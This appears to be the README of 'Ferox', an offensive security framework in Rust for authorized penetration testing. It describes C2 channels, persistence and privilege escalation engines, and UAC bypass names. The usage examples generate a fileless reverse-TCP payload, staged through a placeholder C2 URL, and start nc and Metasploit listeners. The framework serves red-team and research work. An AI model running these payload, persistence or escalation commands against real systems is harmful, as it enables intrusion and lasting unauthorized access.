# 🦊 Ferox Framework

[![Rust](https://img.shields.io/badge/Rust-1.70%2B-orange)]()
[![License](https://img.shields.io/badge/License-MIT-blue)]()
[![Status](https://img.shields.io/badge/Status-Production%20Ready-success)]()

**Ferox** is a modern Rust-native offensive security framework designed for authorized penetration testing, security research, and red team operations. Built with performance, safety, and observability in mind.

---

## 🚀 Quick Start

### Installation
```bash
git clone https://github.com/abdulwahed-sweden/ferox
cd ferox
cargo build --release --features memory-forensics
```

### First Run
```bash
# System diagnostics
./target/release/ferox doctor check

# Launch console
./target/release/ferox console

# Memory forensics
./target/release/ferox memory analyze dump.raw --output report.json
```

## 🎯 Core Features

### 🔍 Memory Forensics
- Volatility3 integration
- YARA scanning
- MITRE ATT&CK mapping
- Export formats: JSON, Markdown, tables

### 🛰️ Command & Control
- Teams Tunnel C2
- HTTP beacon
- DNS C2
- Relay manager

### 🎯 Smart Payload System (Phase 4)
- **Fileless Reverse TCP** with AES-256-GCM encryption
- **Multi-stage payloads** (Stage-1 stager + Stage-2 payload)
- **Cross-platform support**: Windows, Linux, macOS, Universal
- **Execution Command Generators**: Ready-to-paste commands per OS
- **Listener Command Helpers**: Netcat, Socat, Metasploit, Python
- **C2 Integration**: Teams, GitHub Gist, DNS-over-HTTPS, HTTP Beacon

### 🔧 Security Operations
- Reconnaissance (ASN, DNS, WHOIS)
- High-speed scanning
- Exploitation (authorized)
- Post-exploitation: credentials, persistence, lateral movement

### 🔒 Post-Exploitation Engines (Phase 5)
- **Persistence Engine**: Multi-platform persistence with 14 methods
  - Windows: Registry Run, Scheduled Tasks, WMI Events, Services, Startup Folder
  - Linux: Cron, Systemd, Shell RC, XDG Autostart
  - macOS: Launch Agents/Daemons, Login Items
  - Auto-select based on privileges and stealth requirements
  - Built-in redundancy support
- **Privilege Escalation Engine**: Comprehensive privesc enumeration
  - Windows: UAC Bypass (fodhelper, eventvwr, sdclt), Token Impersonation, Service Exploits
  - Linux: Sudo abuse, SUID/SGID binaries, Kernel exploits, Capabilities
  - MITRE ATT&CK mapping for all techniques
  - GTFOBins integration references

### 🗂 System Management
- SQLite session tracking
- Tamper-proof audit logs
- Safe mode for dangerous modules
- Policy-based authorization

## 🛠️ Usage Examples

### Interactive Console
```bash
ferox> use scanner/port
ferox (scanner/port)> set RHOSTS 10.0.0.0/24
ferox (scanner/port)> set PORTS 1-1000
ferox (scanner/port)> run --json > scan_results.json
```

### Memory Analysis
```bash
ferox memory analyze memory.dmp --database analysis.db
ferox memory malfind memory.dmp --min-score 0.6 --mitre
ferox memory pslist memory.dmp --format table
```

### System Diagnostics
```bash
ferox doctor check --critical
ferox doctor check --format json
ferox doctor dependency python
ferox doctor dependency volatility
```

### C2 Operations
```bash
ferox c2 list --status active
ferox c2 setup teams_tunnel --team-id "security-team"
ferox c2 test http_beacon --target http://target.com
```

### Smart Payload Generation
```bash
# Interactive payload generation
ferox> use payloads/rev_tcp_fileless
ferox (payloads/rev_tcp_fileless)> set LHOST 192.168.1.100
ferox (payloads/rev_tcp_fileless)> set LPORT 4444
ferox (payloads/rev_tcp_fileless)> set TARGET_OS windows
ferox (payloads/rev_tcp_fileless)> run

# Output includes:
# - Encrypted payload (Base64/Hex)
# - Ready-to-paste execution commands:
#   - PowerShell Base64 Decode & Execute
#   - PowerShell Encoded Command
#   - CMD via PowerShell
# - Listener commands:
#   - nc -lvnp 4444
#   - msfconsole multi/handler

# Staged payload with C2
ferox (payloads/rev_tcp_fileless)> set STAGED true
ferox (payloads/rev_tcp_fileless)> set C2_URL https://c2.example.com/stage2
ferox (payloads/rev_tcp_fileless)> run
```

### Persistence Engine
```bash
# List all persistence methods
ferox persist list

# Auto-install persistence (safe mode)
ferox persist auto --platform windows --payload /path/to/agent --redundancy 2

# Show method details
ferox persist describe registry_run_hkcu

# Verify/remove persistence
ferox persist verify
ferox persist remove
```

### Privilege Escalation Engine
```bash
# List available enumerators
ferox privesc list

# Auto-enumerate and exploit (safe mode)
ferox privesc auto --platform windows --command cmd.exe

# Enumerate specific platform
ferox privesc enumerate --platform linux --category sudo

# Show technique details
ferox privesc describe uac_bypass
```

## 🎨 Interface — Mixed Predator Theme
- Dark, high-contrast security palette
- Minimal animations (calm UI)
- Terminal-optimized typography
- Clean status symbols (✅ ❌ ⚠️ ℹ️)

## 🛡️ Safe Mode Example
```bash
SAFE_MODE=1 ferox --mock run c2/teams_tunnel
SAFE_MODE=1 ferox console
```

## 🔧 Architecture
```text
Ferox CLI Integration Layer
       ↓
[doctor, memory, c2, sessions, persist, privesc, console]
       ↓
Module Registry & Session Manager
       ↓
Security Engine (Async Rust)
       ↓
[Scanner, Recon, Exploit, Payloads, Memory, C2, Post, Auxiliary]
       ↓
┌─────────────────────────────────────────────────────────────┐
│  Smart Payload Engine (AES-256-GCM, HKDF, Multi-Stage)      │
│  Persistence Engine (14 methods, 3 platforms)               │
│  Privilege Escalation Engine (7 enumerators, 2+ exploits)   │
└─────────────────────────────────────────────────────────────┘
```

## 📦 Module Categories
| Category | # | Description |
| --- | --- | --- |
| Scanner | 8 | Port & service detection |
| Recon | 6 | Information gathering |
| Exploit | 4 | Authorized exploitation |
| **Payloads** | 3 | Smart payload generation with encryption |
| Memory Forensics | 8 | Volatility3 workflows |
| **Post-Exploitation** | 14+ | Persistence (14 methods), PrivEsc (7 enumerators) |
| C2 & Evasion | 12 | Communication & stealth |
| Auxiliary | 5 | Utility modules |

## 🩺 Ferox Doctor — Diagnostics Engine
```bash
# Full check
ferox doctor check

# Dependency inspection
ferox doctor dependency python
ferox doctor dependency volatility

# Auto-fix (when supported)
ferox doctor check --fix

# Formats
ferox doctor check --format json
ferox doctor check --format markdown
```

## 🔒 Security & Authorization

**Ferox is designed exclusively for authorized security work.**

### Permitted
- Authorized penetration testing
- Red team assessments
- Security research
- CTFs
- Defensive training

### Prohibited
- Unauthorized access
- Criminal activity
- Malicious operations
- Violating laws/regulations

### Built-in Safeguards
- Authorization context
- Immutable audit logs
- Safe mode for high-risk modules
- Policy-based access control

## 📚 Documentation
- docs/overview.md — Architecture & mission
- docs/console.md — Console usage
- docs/modules.md — Module catalog
- docs/memory-forensics.md — Memory workflow
- docs/c2.md — Command & control layer
- docs/maintenance.md — Ferox Doctor

## 🛣️ Roadmap
- [x] v2.0.0 – Memory forensics engine
- [x] **Phase 4** – Smart Payload System with execution command generators
- [x] **Phase 5** – Persistence & Privilege Escalation Engines
- [ ] Signed plugin marketplace
- [ ] Web operator dashboard
- [ ] Hardware-backed credential vault
- [ ] Extended evasion techniques

## 🤝 Contributing
1. Fork and branch:
    ```bash
    git checkout -b feat/description
    ```
2. Run full tests:
    ```bash
    cargo test --features memory-forensics --tests
    ```
3. Document all new modules.
4. Include authorization/audit notes in PR.

## 📄 License
Released under the MIT License. Usage limited to ethical and authorized scenarios.

## 📬 Support
- Maintainer: Abdulwahed Mansour
- Email: abdulwahed.mansour@gmail.com
- Security Contact: security@ferox.local
- GitHub: @abdulwahed-sweden

Fast. Fierce. Fearless. Authorized. 🦊